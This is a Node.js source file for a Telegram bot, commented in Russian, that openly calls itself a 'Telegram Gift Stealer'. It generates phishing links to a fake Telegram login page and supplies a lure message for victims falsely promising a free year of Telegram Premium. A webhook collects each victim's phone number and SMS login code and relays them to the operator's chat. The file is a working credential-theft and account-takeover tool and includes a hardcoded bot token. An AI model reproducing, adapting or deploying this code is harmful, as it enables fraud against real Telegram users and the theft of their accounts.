const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// ==== НАСТРОЙКИ ==== //
// ЗАМЕНИ ЭТО СВОИМИ ДАННЫМИ:
const BOT_TOKEN = '8280258891:AAFMkGWctd-5D1noCN-mdraftoAabv162qE'; // ТВОЙ ТОКЕН
const YOUR_CHAT_ID = '8280258891'; // ТВОЙ CHAT ID
const DOMAIN = 'https://telegram-gift-stealer-gv9a.vercel.app/'; // ТВОЙ URL VERCEL
// ================== //

const bot = new TelegramBot(BOT_TOKEN, {polling: true});
const app = express();
app.use(express.json());

// Простое хранилище в памяти
const activeLinks = {};

// Проверка что бот работает
console.log('🤖 Bot starting...');
bot.getMe().then(me => {
    console.log(`✅ Bot @${me.username} is running`);
}).catch(err => {
    console.error('❌ Bot error:', err.message);
});

// Команда /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    console.log(`🚀 /start from ${chatId}`);
    
    bot.sendMessage(chatId, 
        `🎁 *Telegram Gift Stealer Bot*\n\n` +
        `*Команды:*\n` +
        `/generate @username - Создать фишинг-ссылку\n` +
        `/test - Проверить работу бота\n` +
        `/mylinks - Мои активные ссылки\n\n` +
        `Бот работает: ✅`,
        {parse_mode: 'Markdown'}
    );
});

// Команда /test
bot.onText(/\/test/, (msg) => {
    const chatId = msg.chat.id;
    const testCode = 'test' + Date.now().toString(36);
    activeLinks[testCode] = {chatId, target: '@testuser'};
    
    const url = `${DOMAIN}/login.html?code=${testCode}`;
    
    bot.sendMessage(chatId,
        `🧪 *ТЕСТ БОТА*\n\n` +
        `Бот отвечает: ✅\n` +
        `Chat ID: \`${chatId}\`\n` +
        `Тестовая ссылка: ${url}\n\n` +
        `*Если видишь это сообщение - бот работает.*`,
        {parse_mode: 'Markdown'}
    );
});

// Команда /generate
bot.onText(/\/generate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1].trim();
    
    console.log(`🔗 /generate from ${chatId} for ${target}`);
    
    // Генерация уникального кода
    const code = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    
    // Сохраняем ссылку
    activeLinks[code] = {
        chatId: chatId,
        target: target,
        created: new Date(),
        visits: 0
    };
    
    // Создаем URL
    const phishingUrl = `${DOMAIN}/login.html?code=${code}&ref=tg_gift`;
    
    // Сообщение для жертвы (скопируй и отправь)
    const victimMessage = `🎉 ПОЗДРАВЛЯЕМ! Вы выиграли Telegram Premium на 1 год!\n\n` +
                         `Чтобы получить подарок, перейдите по ссылке:\n` +
                         `${phishingUrl}\n\n` +
                         `Активируйте в течение 24 часов!`;
    
    // Ответ бота
    bot.sendMessage(chatId,
        `✅ *ССЫЛКА СОЗДАНА*\n\n` +
        `*Цель:* ${target}\n` +
        `*Код:* \`${code}\`\n` +
        `*Фишинг URL:*\n\`${phishingUrl}\`\n\n` +
        `*СООБЩЕНИЕ ДЛЯ ЖЕРТВЫ:*\n` +
        `\`\`\`\n${victimMessage}\n\`\`\`\n\n` +
        `📊 *Статус:* Ожидает перехода\n` +
        `🔔 Уведомление придет сюда`,
        {parse_mode: 'Markdown'}
    );
    
    // Логируем
    console.log(`✅ Link created: ${code} for ${target}`);
});

// Команда /mylinks
bot.onText(/\/mylinks/, (msg) => {
    const chatId = msg.chat.id;
    
    const userLinks = Object.entries(activeLinks)
        .filter(([code, data]) => data.chatId === chatId);
    
    if (userLinks.length === 0) {
        bot.sendMessage(chatId, '📭 У вас нет активных ссылок.\nИспользуйте /generate @username');
        return;
    }
    
    let response = `📋 *ВАШИ ССЫЛКИ* (${userLinks.length})\n\n`;
    
    userLinks.forEach(([code, data], index) => {
        const url = `${DOMAIN}/login.html?code=${code}`;
        const timeAgo = Math.round((new Date() - data.created) / 60000); // минут
        
        response += `*${index + 1}. ${data.target}*\n`;
        response += `Код: \`${code}\`\n`;
        response += `Переходов: ${data.visits}\n`;
        response += `Создана: ${timeAgo} мин назад\n`;
        response += `URL: \`${url}\`\n\n`;
    });
    
    bot.sendMessage(chatId, response, {parse_mode: 'Markdown'});
});

// Вебхук для получения данных
app.post('/webhook', (req, res) => {
    const { code, phone, sms_code } = req.body;
    
    console.log('📨 Webhook received:', { code, phone, sms_code });
    
    if (activeLinks[code]) {
        const link = activeLinks[code];
        link.visits++;
        
        // Отправляем уведомление в Telegram
        bot.sendMessage(link.chatId,
            `🎯 *ДАННЫЕ ПОЛУЧЕНЫ!*\n\n` +
            `*Ссылка:* \`${code}\`\n` +
            `*Цель:* ${link.target}\n` +
            `*Номер телефона:* \`${phone}\`\n` +
            `*SMS код:* \`${sms_code}\`\n\n` +
            `✅ Подарки будут автоматически переведены\n` +
            `⏱ Ожидайте 1-2 минуты`,
            {parse_mode: 'Markdown'}
        );
        
        console.log(`📱 Data sent to ${link.chatId}`);
    }
    
    res.json({ success: true, message: 'Data received' });
});

// Старт сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
    console.log(`🔗 Domain: ${DOMAIN}`);
});

// Экспорт для Vercel
module.exports = app;
